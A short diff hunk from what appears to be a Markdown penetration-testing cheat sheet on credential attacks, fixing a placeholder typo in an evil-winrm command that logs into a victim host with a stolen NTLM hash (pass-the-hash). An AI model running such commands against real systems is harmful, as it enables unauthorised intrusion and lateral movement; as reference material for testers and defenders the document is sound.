@@ -188,7 +188,7 @@ As a result of extracting credentials from a host an attacker might get NTLM has
 ### Using WinRM
 
 ```bash
-evil-winrm -i <victim-ip> -u <username> -H <html-hash>
+evil-winrm -i <victim-ip> -u <username> -H <ntml-hash>
 ```
 
 ## Kerberos - Pass-the-Ticket
